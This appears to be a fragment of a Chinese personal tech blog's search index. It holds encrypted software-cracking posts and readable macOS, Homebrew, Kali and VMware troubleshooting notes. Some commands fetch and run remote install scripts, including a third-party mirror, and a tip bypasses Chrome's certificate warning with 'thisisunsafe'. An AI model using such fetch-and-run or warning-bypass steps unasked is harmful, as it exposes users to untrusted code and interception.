98813a054eb2a66322d504961b78e38cf4904774d868a08238afccb14e247e8a8c9c6359c4436b50ab68f21219b78e1bf5d044569cf3ed99daa2dd78dffccc7e5c0423c2d4806050067d2846e719c21ebc1a6ec966300f2049df038fd0eb34c293816b09e1f9ba27d85aaf1a4fd6a4909304bf522a793649ab700ed9de06e54f1419e962f5c6f38f93eae6b55ffb4e9d98877ab14bab4d9b0489b5832b4034b45f0f246c49809f9b3b62c81a13de352383c5bb2a87ec7df7cf071d9ecdec21febc7427ec7c7a11d6b3862cbd151166af28294f53ded599045e7d046797546a6fdf335d91ef7b6be0791b09516c81a9bf90e15d605160ee8aadbe37b9cfe7afce096327da7ed985c1daf97d5915e5a7ca88c4e64465e3c3da8455e82e2559db25fee43b017436baaab18d6194a6761c0d7835167ba6e8d24c0100505ba16f1ea094c9867a178e642ef5d2912651de0956c77ffd28cae894b9bf1fee75640e4f1d9b67c0ad3a47a09895e9fffc1f6a0529af0ad73be7c8821c5a8a16943e774016eb8d34363e85e56f8c5ac66635df9413ceeec22352ad281ca090bb845a207ee0a1f8eaa2640f9b9ab0bdcbbd55ce238c829c5f35077b89e389bda0defeb5a74ddfe1c94a0dcc1ee60bc2a475e9a87d9468aab70aab7245e595b9748cb6fc623dff9a8cafdb00362f201fe084ec1597bc2864498df99a866ef1e4a3ef7870918b150ccd76e10e820a05b6423cffe79f88491574b25fc29098e780cf0daa13e33b6bd9fe9fbabf2d49e3936be19b45a4ab53d2c93b3add76224528b8cf24360bc66095b4c89c0b50dfa33393058ddcd2085e20599d0aac061bae5e114f9d47496c3692dd41207cc9226cab50128e65fc80ffeec12847e085adfd2e67a2c5d5c2e51dff412b78850ac6c9ac4687c3bfdb254106e07132d3c6eb845cf3a1c19cf30c82cf0d2e5185954dcbc488f540b9b1bc2ab757e6a6f2023a9129f14297112dd274e371f64b56876472ffdc7c3eb42f6a513a8f42d0d18b6634af1a5892af1896aab05e0fef2503586853c478aa54906eee2d2177e614b5a4db725d24591651a9df436874c7eac78d5f9f405a1c42c81178104f96030996d09ec169ed5f7fd70e10fda12b2f713079f833f13fbd39da6de209818f56e8a91b9546b4e48a1a0c38d67196b96d870103da7f6eeb104c7dda90cb153a50de0eae7a6357f2a4ed91e0b146ac3fe69612e2ea064e4527fe6c28b79b01cfa9859f79e14b043fcdea0bfc26217ecf343dc4a31276be1aefc03617f8fc979c8abacce200aea82b7c596bb17b8bfb973fb2bd885c827636a9303b8922b7f3f761d07ba794d01e9d0943638e15ad99b605a1a4bb25a2e74e3e50a4ff344d5e09d2b20ac46a55ad3928d028fc6792c171b35896ee602c9ccddd6936e5785e84787ba868a79952f15651a7a0df20112449bacc4291db23f4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">您好，请在这里输入密码哦，密码获取方式请见首页</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
            <tag> 和谐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text3和谐</title>
      <link href="/sofware/sublimetext/"/>
      <url>/sofware/sublimetext/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ccc57799f2d67cbadcc4d09f368461fb5b99b3cfed381c207b92c197f76ea8af">46e0ce6797294e0b19265e3054eb832cc7fbbcee0461e98ff1a3e2048cf2b6012591e93f6219da0f0f69b720bf980fc2ed096bc64446cfbeec65a0960050a6fd17cfbc684abb2e25eeb2d154f2f4e76cbdbc17c8a459ec23dbee842ff77b88848bdfa1b1c1b96064b4846713e0a8cdb9728780ec4907ca56d6179877ce7cdc788a60177d3047ff31d82c967d9a60f2320da54db099d1395fffb18417788923ac1fd9bf4b545d28a96553e2354185b56b6045af329855bb439a54c9226dd7ae6176b6c816aae7a82f26b4851d1eb7250f4fefe6fd3cc53eaf64b915f1a17d8b6f9f886897cdf88e30b520763aad401ad65b806c744527a3a7b5a3c0d5a56c2266040f145542e4a02667624925d346ab23bac178d2933155e49b01cd8d50e33c6f2bea975b35c32e90898c40e266920af0c0f5440363e281d5b1d262d8f13db56f9cf5e791d05daa10c0cbdef2ff4cb0ae8308014485b8005779f2be8f41812f3f38610926c0f50337edf3c20163a599e2e007648e2b7c299c6363d1e2264688facacb3f8e77a6dc93bb1384ed25ee99dfceff62ec7a7036607d1cf8cc65be5b12d259598cc38270ace50b0cfae43dd1222ed5aa8b6952f80dfb2a404d29db126f33e93f92e515fd58e20edb4e9f84daa234b5563f3af9fb7cfc6b4a9888514f791b207be3d8f5932c71e756708548ef0d0bd78899fac79254428d6d70c36c15fd91172894700fcc1c53df4bea1483487f82e54a4832d2943f632fe32a1d83816650fd58d1e78fd2c3625218868dd0846866adf0d7554df37256843dd2f43588ed72b88ee724f9831bcefaa872ba81595c5134b50ea31e70b9457cb5693d5eb5d1f6b7497916b9149210dd7ad5c63f170047d61eed39216d3a82db4f5707107af9d464160b8ea16de71f3866059dc01baf9eba785dbf84779a8de71e52f68a398f091fd0aac0ff8a87e6dd403df5ad0f055fe19f4674b14c68ecc83ea49d663d95722fb0bb9e29dbb199c104b7ab7f6760714ad758bbe7bd9f364f4fc5254be287a3e047e1ec12aec68b1388df7c5f083e395d857da84b0b409198fe916773577461b470cb04b8b0681fd4c2affe9a9a3b5cc68b2a77bda646f3a7eec1da62de917fe7660d3496194f6918ac7c79845d3941bdb86cc4c988cd9e488568b634b2634bcaa6b92530e03a67699f9d9e054e954ed7da382b9d796dacff2988ad9e7659738eca61936b62f8a0715d6f9dd9a2b3282c9ffd314f2517536c4866abbe514568760127d8de9105b6bd7e4f09a19f5df3208c4d8143979f1fe356c4cf3627defe49587e21a2739d567f2d93dc1a366719dd0031b42fc71001b16cdf434637e8ef9a45a1e70c6ff53b82e72df1b42578330bb043e8fab2769eb35f271f84e712d48ca119d08b06ad169552329ef5f7b5e73929023daefaa0b078caad69cc4f68e58d1451ed1e43ca3d2a40937754f2d839cc9ccda49076821e1dd330553546c5b849685e5efea5ec82e677d967e686105eeebf43e32eb0497dad9b618c7f10f2ca1ddd062c5b66137f45a2a8bb1a2347005f0b14716d6487399e4381a53c5dac3eb95a6171a71601ba42d4c7107148910522e8d8184a6186403c323ddc7de1031e16534f0663cdcd1c117f76ceefb80b6850134fe68d403b61593eb3c5ea6ac3e789038a3e2016a3f3f8e4dbd5db10fa06217e65d28ed330e727b4e98c14c4b25b523f59c6c76ac781a1fd0189b62e028b00f532123f536b07238b78cf3bbc8ae9a4e2f34fad26429907c11bc633cdf3c56c88f7de1713a3c0ba2eb786839c7f5cb01734149a3450317f60c03e8a0c2b347e72ada3a140bfa2b4f7f3966aba50019d229055a73f76b99154adf2df045778b9db0da2099d1db0c6a95864ef4ccad3ae8296f39b19a5f1e1a2a82770a8fcd42a91d7c11cd22f60566ce18b6b89ae6a989af90b82ba9398f0b4a5a891f43d2675fc836eb2436a6fde41363284419b43e00ae131adca40a02cd111797e3d9557b77f046514036ae12fed2275a1d077cb9c5ff084de80ba07c538d89846c670ec94c37494ccc709984f960a25372edca93613e4f1a3498918e2b27765017f7c052ba68bc1110377bab57940cf8bb58f9900280e2cdbbbb5014a562f09073b4b43df4c41bf5b9c37bf9574cc20280956807e877791fe612ce8c844d01d9a8a85dc7440a12dca75e5a645289fa6afc163182d3fbeb0659727a27465a0c730756e08b1d8b7b068baa39007e844e859483fe829dc2d4d729f0074c732ba9d89014eb15627e5a9882e8729bf3463773370b92449683e1f890d17735c021c289620a68e8f8a14d867dad716d8f11ceebcad907b9f7db3770dbcd4ab29888b5e87fc0ad9ea9795961587f2446c47322efa294a5a6d497291816e7735d1cd298118656527988bcca4f461106b262f0403a79612112c888619c370fd1909d3f314c3558e6c9df3cf00059d276eb46c29b8fd31367c7f4ff47d4e4411fc7141ad82da6e0e1bc4a15e100d11bbe3f00fb503b92e6d8db01dd6c2aa81dd1e167d8d6353656d5f2aa4863a646ee16459281176d3267d1367f2455e9bf72fb4881d52e71b29bc882a5a557a8657288899d15c971a698eefe9cfa72bcb4a0fc8667a39f578e6b457d3c16e40a8d63dafc27e24c0edfcd35a0ad0928b79aa738cfe86c3b5d5567fb675b2c1d2d3814b56affabd685da7db3890b80cefa1296208e6943970dab0f80b0d7eb69e7255a3b9674e53dfa2a41468d01ad351c54b3de40ddd4d42de080af1bc379dc028f083796e0a3196a599b509ee668629c89b7e93cd99766e64ddf5a5f71d4838bd00e0feb7a6a8a08b414fe1fceea208462876865f1990d77bdd95f310c63faec7f3ffba360518709f0192933bb41f87a001efac34c26f5b0e4548d3a2e518ad4ddd8b2217d481de1e57ba52d350d58580524a6d08b018a756ed8926a4bfc421e44e39c43c1b66374bd2d9afb75c478ec55cdc47a1cdbf2615c8cb5caefe937acb009f172e44882e460ac8ec5d982ed1d3698b3fea33055335130affcc9a47cefc2e861ebc1e833dc0399379bf733f92196e8340412619d85faa077a429624e9850dc077b0e7df74b0f33be9416c5fd36ec050d344ba8810faf36951186d3b168406e2160a7ecb90bd13f4ad912687e53f2ec4e83616d50cc4c0c4a4fbfef8a799355e5b542b67acb7212183f5e868bc14f4814fbee2bc510aaf0ccac848b2eefa591830647667b9c71e8698c33dec662c9213d747e121b19839346796794488b0f1bc80034f414104d4d33be4c2474c0013b4f8f723a124b942496dc74fc9bf841589fdedae965b2c5c7e009f80489f4fcf7cb722dbc3bbcf3939f86bb3a16479e05b3ef71074fb6ec33210a83e7abcefbfaab586d33be524fefd13eac3967a72577f0e839d22c72b8a4ae1e14f328ad0c30be74f2cba272e7b397952d8bc6b1d8a4e05fe73ac48d17c16bb51995e46763d0d6d0dd561e791f4ff9263c2989f2b86f22de5165030a68a6bf0400fefea50262baa90426affd79caa6dcc3d9c7724a4abdb8e1c65bf54d898db2a00b6ad82f6e4fc903b1fc48a2bc113d7c88435255e6447a367e0dccace48dccf954e375467675f369dd410a7f6728aa4761a56a43f40a893f0b81d56a48c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">您好，请在这里输入密码哦，密码获取方式请见首页</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
            <tag> 和谐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>奇奇怪怪问题的解决方案</title>
      <link href="/computertips/qi-qi-guai-guai-wen-ti-de-jie-jue-fang-an/"/>
      <url>/computertips/qi-qi-guai-guai-wen-ti-de-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在用命令行的时候总会冒出来各种莫名其妙的问题，这里做个合集记录一下，给有缘人解惑</p></blockquote><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><h3 id="curl（35）："><a href="#curl（35）：" class="headerlink" title="curl（35）："></a>curl（35）：</h3><pre class="language-bash" data-language="bash"><code class="language-bash">curl: <span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span> LibreSSL SSL_connect: SSL_ERROR_SYSCALL <span class="token keyword">in</span> connection to xxx:443</code></pre><h4 id="解决方案1："><a href="#解决方案1：" class="headerlink" title="解决方案1："></a>解决方案1：</h4><p>参考链接：<a href="https://stackoverflow.com/questions/48987512/ssl-connect-ssl-error-syscall-in-connection-to-github-com443">https://stackoverflow.com/questions/48987512/ssl-connect-ssl-error-syscall-in-connection-to-github-com443</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">networksetup <span class="token parameter variable">-setv6off</span> Wi-Fi<span class="token comment"># 还原</span>networksetup <span class="token parameter variable">-setv6automatic</span> Wi-Fi</code></pre><h4 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2:"></a>解决方案2:</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#mac自带的版本太旧了</span>brew <span class="token function">install</span> <span class="token function">curl</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH="/usr/local/opt/curl/bin:$PATH"'</span> <span class="token operator">>></span> ~/.zshrc</code></pre><h2 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h2><h3 id="源提示404，解压失败"><a href="#源提示404，解压失败" class="headerlink" title="源提示404，解压失败:"></a>源提示404，解压失败:</h3><p>这个问题是出现在用cunkai脚本安装的homebrew出现的，在下载包的时候清华源返回404的错误，但是从官方源下载了压缩包，但是最终解压缩的时候出现了如下报错</p><pre class="language-bash" data-language="bash"><code class="language-bash">brew tar: Error opening archive: Failed to <span class="token function">open</span> <span class="token string">'/Users/***/Library/Caches/Homebrew/downloads/873d0224aa49d2ed77a0755837c3a4fbad9c6409570447cd2694597032e41306--mpdecimal-2.5.1.big_sur.bottle.tar.gz'</span></code></pre><h4 id="解决方案1"><a href="#解决方案1" class="headerlink" title="解决方案1:"></a>解决方案1:</h4><p>这里选择了直接重置源，理论上也可换源进行尝试，重置源的方法可以参考<a href="https://www.secgxx.com/macos/macos/">macOS的系统设置记录（一)</a></p><h2 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h2><h3 id="提示不是私密连接，点击高级没有继续访问按钮提示"><a href="#提示不是私密连接，点击高级没有继续访问按钮提示" class="headerlink" title="提示不是私密连接，点击高级没有继续访问按钮提示"></a>提示不是私密连接，点击高级没有继续访问按钮提示</h3><p>访问https的网页，以前正常访问提示不是私密连接，可以点击高级，继续访问，但是最近突然没有继续访问的按钮了。</p><h4 id="解决方案1-1"><a href="#解决方案1-1" class="headerlink" title="解决方案1"></a>解决方案1</h4><p>在chrome该页面上，直接键盘敲入这11个字符：<code>thisisunsafe</code></p><h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>最近再做信息收集的时候遇到了OneForAll检测网络环境失败的情况，在大佬的提示下发现是位于<code>/common/utils.py</code>的第498行中，作者提供的接口都失效了。替换了接口以后就万事大吉。下面给出参考接口：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check_net</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://ip-api.com/json/'</span><span class="token punctuation">,</span> <span class="token string">'https://api.ip.sb/geoip'</span><span class="token punctuation">]</span>    url <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>    header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User_Agent'</span><span class="token punctuation">:</span> <span class="token string">'curl'</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="MacBook"><a href="#MacBook" class="headerlink" title="MacBook"></a>MacBook</h2><h3 id="中英文输入法切换卡顿"><a href="#中英文输入法切换卡顿" class="headerlink" title="中英文输入法切换卡顿"></a>中英文输入法切换卡顿</h3><p>这个问题自从升级到BigSur11.1以后就在困扰这SECGXX君，只不过之前是一直时灵时不灵的，所以也就一直在凑合着，不过今天在写markdown的时候就一直切换不过来，十分烦躁于是准备彻底解决一下。</p><p>一番搜索以后发现解决方法也是十分的简单。</p><p>在<code>「系统偏好设置」-&gt;「语言和地区」-&gt;「键盘偏好设置」</code>中取消勾选<code>使用“中/英键切换”ABC“输入模式</code>就会变得非常流畅了，不过这里引入一个新问题就是长按之后好像无法大写锁定了。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626113149.png" alt="20210626113149"></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="仓库过期"><a href="#仓库过期" class="headerlink" title="仓库过期"></a>仓库过期</h3><blockquote><p>E: Release file for <a href="http://ports.ubuntu.com/ubuntu-ports/dists/focal-security/InRelease">http://ports.ubuntu.com/ubuntu-ports/dists/focal-security/InRelease</a> is not valid yet (invalid for another 159d 15h 20min 52s). Updates for this repository will not be applied.**</p></blockquote><p>导致这个错误的原因是因为系统时间和现实时间时钟不同步导致的，重启就可以解决</p><h2 id="Github-DNS污染"><a href="#Github-DNS污染" class="headerlink" title="Github DNS污染"></a>Github DNS污染</h2><blockquote><p>fatal: unable to access ‘<a href="https://github.com/phith0n/mooder.git/">https://github.com/phith0n/mooder.git/</a>‘: LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443</p></blockquote><p>因为一些不明原因有的时候访问GitHub会碰到dns污染，报错如上，这个时候修改一下host文件，写上正确的dns解析就行了。</p><h2 id="kalilinux"><a href="#kalilinux" class="headerlink" title="kalilinux"></a>kalilinux</h2><h3 id="kali安装pdtools"><a href="#kali安装pdtools" class="headerlink" title="kali安装pdtools"></a>kali安装pdtools</h3><blockquote><p>因为一些原因，parallels desktop对kali的支持并不是很好，这也就导致了kali安装pdtools的时候会出现一些奇怪的问题<br>解压kmods里面的压缩包,并删除之前的压缩包（如果想要原文件直接去&#x2F;media&#x2F;cdrom0里面拖出来）：</p></blockquote><p>tar -xzf kmods&#x2F;prl_mod.tar.gz<br>rm prl_mod.tar.gz<br>修改prl_fs&#x2F;SharedFolders&#x2F;Guest&#x2F;Linux&#x2F;prl_fs&#x2F;inode.c，在最上面加上下面这行：</p><p>#define segment_eq(a, b) ((a).seg &#x3D;&#x3D; (b).seg)<br>修改prl_fs_freeze&#x2F;Snapshot&#x2F;Guest&#x2F;Linux&#x2F;prl_freeze&#x2F;prl_fs_freeze.c，在最上面加上下面这行：</p><p>#include &lt;linux&#x2F;blkdev.h&gt;<br>然后重新打包：</p><p>tar -zcvf prl_mod.tar.gz . dkms.conf Makefile.kmods<br>最后.&#x2F;install 成功！</p><hr><p>5.10.0-kali7-amd64需要在prl_fs&#x2F;SharedFolders&#x2F;Guest&#x2F;Linux&#x2F;prl_fs&#x2F;inode.c中添加<br>#define segment_eq(a, b) (b)<br>#define USER_DS 1</p><p>在prl_fs_freeze&#x2F;Snapshot&#x2F;Guest&#x2F;Linux&#x2F;prl_freeze&#x2F;prl_fs_freeze.c中添加<br>#include &lt;linux&#x2F;blkdev.h&gt;</p><p>在prl_fs&#x2F;SharedFolders&#x2F;Guest&#x2F;Linux&#x2F;prl_fs&#x2F;Makefile中添加<br>KBUILD_EXTRA_SYMBOLS :&#x3D; &#x2F;usr&#x2F;lib&#x2F;parallels-tools&#x2F;kmods&#x2F;prl_tg&#x2F;Toolgate&#x2F;Guest&#x2F;Linux&#x2F;prl_tg&#x2F;Module.symvers</p><p>重新打包即可</p><ul><li><p>安装后白屏</p><p>装好白屏把虚拟机里面设置的 3D 加速关掉。</p></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://link.zhihu.com/?target=https://forum.parallels.com/threads/2020-2-kali-linux-parallels-tools-error.350083/page-2">2020.2 Kali Linux, Parallels Tools Error</a></li><li><a href="https://www.coco413.com/archives/63/">https://www.coco413.com/archives/63/</a></li><li><a href="https://zhuanlan.zhihu.com/p/340544345">https://zhuanlan.zhihu.com/p/340544345</a></li></ul><h2 id="E-Unable-to-lock-directory-var-lib-apt-lists"><a href="#E-Unable-to-lock-directory-var-lib-apt-lists" class="headerlink" title="E: Unable to lock directory &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;"></a>E: Unable to lock directory &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;</h2><p>sudo fuser -vki &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;lock</p><h2 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h2><h3 id="VMware与hyper-V冲突解决办法"><a href="#VMware与hyper-V冲突解决办法" class="headerlink" title="VMware与hyper-V冲突解决办法"></a>VMware与hyper-V冲突解决办法</h3><p><strong>解决办法：</strong><br><code>bcdedit /set hypervisorlaunchtype off</code></p><p><strong>还原：</strong><br><code>bcdedit /set hypervisorlaunchtype auto</code></p><h3 id="NAT下主机与虚拟机无法互通解决方案"><a href="#NAT下主机与虚拟机无法互通解决方案" class="headerlink" title="NAT下主机与虚拟机无法互通解决方案"></a>NAT下主机与虚拟机无法互通解决方案</h3><ul><li>虚拟机VMnet 0 桥接至对应网卡</li><li>Vmnet 8（NAT网卡）配置*.*.*.1,其中无线状态下配置网关，有线连接时不配置网关</li><li>重启网卡即可互通</li></ul>]]></content>
      
      
      <categories>
          
          <category> ErrorSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ErrorSolved </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS的系统设置记录（一）基础配置</title>
      <link href="/macos/macos-de-xi-tong-she-zhi-ji-lu-1/"/>
      <url>/macos/macos-de-xi-tong-she-zhi-ji-lu-1/</url>
      
        <content type="html"><![CDATA[<h1 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h1><blockquote><p>本文所写的内容全部基于macOS Big Sur 11.1</p></blockquote><p>作为一个用了N年Windows的人，对于mac那是一直非常馋的，但是由于对峡谷的热爱和囊中羞涩，一直到了去年年底才入手了第一台mbp。<br>拿到手那肯定是要开始折腾了，于是就开始了没有尽头的踩坑之路。所以一直计划着写一篇包括了设置系统、装软件、配路径等等内容包含在内的一篇文章，来帮助自己再买新电脑的时候如果time machine没法用，还有的参考。</p><h2 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h2><h3 id="初次开机踩的坑"><a href="#初次开机踩的坑" class="headerlink" title="初次开机踩的坑"></a>初次开机踩的坑</h3><p>开机设置其实没什么难的，跟着引导一步步操作就好，这里只有一个坑点需要稍微注意一下。在进入系统之前，&#x3D;&#x3D;单指轻触是没有开的！！！&#x3D;&#x3D;所以你要用力按下去才是点击。GXX在初始化设置的时候卡在这里可能得有一个小时- -</p><p>进入桌面以后如果对单指轻触有需求，从左上角的<i class="fab fa-apple"></i><i class="fas fa-arrow-right"></i>系统偏好设置<i class="fas fa-arrow-right"></i>触摸板进行修改。</p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210420055949048.png" alt="" style="zoom: 25%;" /><p>同时也建议花上几分钟在这个设置里面学习一下。</p><h3 id="时间机器（Time-machine）"><a href="#时间机器（Time-machine）" class="headerlink" title="时间机器（Time machine）"></a>时间机器（Time machine）</h3><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/AppIcon-8967081.png"><br>时间机器可以说是macOS的一个非常有标志的特色了，它可以帮助你快速的把系统恢复到一个你保存过的状态。是的，听起来就像是虚拟机恢复快照一样。</p><p>所以开机后第一件事最好就是找一块移动硬盘做一次全量的备份，这样后面折腾一些东西崩了的时候还有机会恢复到最纯净的状态（重装当然也可以，只不过这样比较快）</p><p>时间机器的问题就在<i class="fab fa-apple"></i><i class="fas fa-arrow-right"></i>系统偏好设置<i class="fas fa-arrow-right"></i>时间机器</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421103722828.png" alt="image-20210421103722828"></p><h3 id="启动台"><a href="#启动台" class="headerlink" title="启动台"></a>启动台</h3><p>启动台里的应用图标默认是5行8列的大图标，显示的内容是比较少的，如果不想分组归类的话也可以通过命令进行设置，命令如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置列数</span>defaults <span class="token function">write</span> com.apple.dock springboard-columns <span class="token parameter variable">-int</span> <span class="token number">9</span><span class="token comment"># 设置行数</span>defaults <span class="token function">write</span> com.apple.dock springboard-rows <span class="token parameter variable">-int</span> <span class="token number">6</span><span class="token comment"># 重启 Dock 生效</span><span class="token function">killall</span> Dock</code></pre><p>设置完成以后的显示效果看起来好了不少</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421110804910.png"></p><p>如果你想恢复默认的话可以使用下面的命令。恢复默认的配置：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 恢复默认的列数和行数</span>defaults <span class="token function">write</span> com.apple.dock springboard-rows Defaultdefaults <span class="token function">write</span> com.apple.dock springboard-columns Default<span class="token comment"># 重启 Dock 生效</span><span class="token function">killall</span> Dock</code></pre><h3 id="Dock栏"><a href="#Dock栏" class="headerlink" title="Dock栏"></a>Dock栏</h3><p>Dock栏的设置总的来说就是移除一些基本在国内不会用到的Apple的应用，然后根据用途把图标放在一起。这里gxx推荐把dock放在侧边，可以有效的利用屏幕空间。</p><h2 id="终端设置"><a href="#终端设置" class="headerlink" title="终端设置"></a>终端设置</h2><blockquote><p>用上了mac，就无可避免的会用的终端，下面就记录一下对命令行和终端应用的优化与配置。</p></blockquote><h3 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h3><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/Terminal.png"></p><p>Terminal（终端）是macOS自带的命令行终端，可通过点击Dock图标、Command+空格搜索、在启动台-实用工具中打开。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210421122350891.png"></p><p>终端的偏好设置没有特别多的可以设置的地方，可以在描述文件里面更改一下主题，默认主题看的时间长了感觉有点刺眼。</p><h3 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h3><p>Homebrew  是一款自由及开放源代码的软件包管理系统，用以简化macOS系统上的软件安装过程<br>后面许多安装都可以依靠homebrew，可以说大部分免费的软件只有你想不到，没有它装不了，因此首先在terminal里安装homebrew</p><h4 id="原始安装"><a href="#原始安装" class="headerlink" title="原始安装"></a>原始安装</h4><pre class="language-bash" data-language="bash"><code class="language-bash">/usr/bin/ruby <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.githubusercontent.com/Homebrew/install/master/install<span class="token variable">)</span></span>"</span><span class="token comment"># 给 homebrew 文件夹的写入权限</span><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span> /usr/local/*<span class="token comment"># 更换源（可选）</span><span class="token builtin class-name">echo</span> <span class="token string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles'</span> <span class="token operator">>></span> ~/.zshrc<span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 再更新一下试试看效果 注意网速 应该可以跑满</span>brew update</code></pre><h4 id="国内安装"><a href="#国内安装" class="headerlink" title="国内安装"></a>国内安装</h4><p>无法🔬上网的国内安装可以使用如下脚本，会自动写入清华源</p><pre class="language-bash" data-language="bash"><code class="language-bash">/bin/zsh <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh<span class="token variable">)</span></span>"</span></code></pre><h4 id="重置brew"><a href="#重置brew" class="headerlink" title="重置brew"></a>重置brew</h4><p>初次接触包管理器的话很容易就把自己玩儿崩了，不过不要慌，利用如下命令重置即可，然后再手动删除在zshrc中的源即可。如果是利用cunkai大佬脚本安装的，再执行一次就重置了</p><pre class="language-bash" data-language="bash"><code class="language-bash">重置brew.git:<span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--repo</span><span class="token variable">)</span></span>"</span><span class="token function">git</span> remote set-url origin https://github.com/Homebrew/brew.git重置homebrew-core.git:<span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--repo</span><span class="token variable">)</span></span>/Library/Taps/homebrew/homebrew-core"</span><span class="token function">git</span> remote set-url origin https://github.com/Homebrew/homebrew-core.git再删除掉zshrc中与brew有关的内容brew clean upbrew update重启中断</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/image-20210422220526408.png" alt="image-20210422220526408"></p><h4 id="软件备份"><a href="#软件备份" class="headerlink" title="软件备份"></a>软件备份</h4><pre class="language-bash" data-language="bash"><code class="language-bash">brew bundle dump <span class="token parameter variable">--describe</span> <span class="token parameter variable">--force</span> <span class="token parameter variable">--file</span><span class="token operator">=</span><span class="token string">"~/Desktop/Brewfile"</span></code></pre><h4 id="批量更新"><a href="#批量更新" class="headerlink" title="批量更新"></a>批量更新</h4><pre class="language-bash" data-language="bash"><code class="language-bash">brew update <span class="token operator">&amp;&amp;</span> brew upgrade<span class="token comment">##cask</span>brew tap caskroom/caskbrew tap buo/cask-upgradebrew cu <span class="token parameter variable">-a</span><span class="token comment">##mas</span>brew <span class="token function">install</span> masmas upgrade</code></pre><h3 id="iTerm2"><a href="#iTerm2" class="headerlink" title="iTerm2"></a>iTerm2</h3><blockquote><p>iTerm2 is a replacement for Terminal and the successor to iTerm. It  works on Macs with macOS 10.12 or 